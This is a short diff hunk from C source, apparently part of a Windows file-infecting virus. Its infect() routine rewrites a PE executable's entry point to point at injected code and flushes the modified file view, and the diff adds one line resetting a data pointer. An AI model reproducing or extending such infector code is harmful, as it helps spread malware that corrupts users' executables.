@@ -39,6 +39,7 @@ int infect(const char *filename, void *entry_function_addr) {
                 (uint32_t)BYTE_DIFF(entry_function_addr, code_begin);
 
             modify_entrypoint(nt_headers, entry_offset, target_code_begin);
+            reset_data_pointer(target_code_begin);
 
             get_data()->function_list.flushViewOfFile(file_view.start_address,
                                                       extended_size);
